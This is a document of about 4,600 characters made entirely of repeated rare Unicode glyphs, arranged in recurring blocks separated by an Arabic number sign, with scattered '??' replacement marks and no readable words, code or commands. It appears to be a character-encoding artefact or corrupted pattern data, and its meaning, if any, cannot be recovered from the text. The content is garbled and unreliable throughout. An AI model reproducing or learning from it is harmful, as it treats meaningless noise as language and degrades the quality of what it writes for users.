࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡙࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬??࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬